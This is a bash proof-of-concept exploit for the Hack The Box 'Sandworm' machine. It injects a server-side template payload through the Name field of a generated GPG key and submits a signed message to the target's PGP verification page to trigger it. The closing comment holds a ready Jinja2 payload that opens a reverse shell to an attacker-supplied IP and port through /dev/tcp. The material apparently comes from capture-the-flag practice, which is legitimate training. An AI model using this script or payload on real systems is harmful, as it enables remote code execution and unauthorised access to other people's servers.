#!/bin/bash

# Sandworm HTB
# ------------
# Description: SSTI of the "Name" field (when creating a public key with gpg) when verifying a signed message on the web
# Author: Marss
# Date: 17 Aug, 2023


# Ctrl + c
# (function)
signal_handler(){
    echo -e "\n[!] User aborted"
    delete_data; exit 1
}
# (signal)
trap signal_handler SIGINT

# Help panel
help_panel(){
    echo -e "\n| Sandworm SSTI PoC |"
    echo
    echo -e "[*] Usage: $0 -t <template_inyection>"
}

ssti_attack(){
    echo -e "\n| Sandworm SSTI PoC |\n  "
    echo -e "[+] Generating public key, message and signed message with template"
    generate_data
    echo -e "[+] Sending public key and signed message to PGP web service"
    output=$(send_data)
    echo -e "[+] Filtering inyection response"
    echo -e "\n$output\n"
    echo -e "[-] Removing public key, message and signed message"
    delete_data
}

generate_data(){
    # create public key
    pub_key_data=$(gpg --batch --passphrase "" --quick-generate-key "$template_injection" 2>&1)
    # extract UID key
    uid=$(echo $pub_key_data | awk -F'/' '{print $NF}' | tr -d "'" | xargs basename -s .rev)
    # create file with random content
    file_name=$(echo $RANDOM | md5sum | head -c 10); echo $RANDOM > "$file_name.txt"
    # sign message with our public key
    gpg --clear-sign -u "$uid" "$file_name.txt"
    # export public key
    pubkey_name="$file_name".key
    gpg --export --armor -r "$uid" > $pubkey_name
}

send_data(){
    response=$(curl -s -k -XPOST "$base_url/process" \
                -H "application/x-www-form-urlencoded" \
                --data-urlencode "signed_text@$file_name.txt.asc" \
                --data-urlencode "public_key@$file_name.key" \
                | grep -oP "Good signature from (.*?) \[unknown\]")
    
    echo "$response" | python3 -c 'import html, sys; [print(html.unescape(c), end="") for c in sys.stdin]'
}

delete_data(){
    # delete publick key, message and signed message
    gpg --batch --yes --delete-secret-keys $uid
    gpg --batch --yes --delete-keys $uid
    rm -f "$file_name.txt" "$file_name.txt.asc" "$file_name.key"
}

# Main flow
if [ "$#" -eq 0 ]; then
    help_panel; exit 1
fi

# variables
base_url='https://ssa.htb'
uid=''
file_name=''

while getopts ":ht:" opt
do
    case $opt in
        h)
            help_panel; exit 0;;
        t)
            template_injection=$OPTARG;
            ssti_attack;;
        \?)
            echo -e "\n[x] Error: Invalid option"; exit 1;;
    esac
done

#template_injection="{{''.__class__.__mro__[1].__subclasses__()[439](\"bash -c 'bash -i >& /dev/tcp/$ip/$port 0>&1'\",shell=True,stdout=-1).communicate()[0]}}"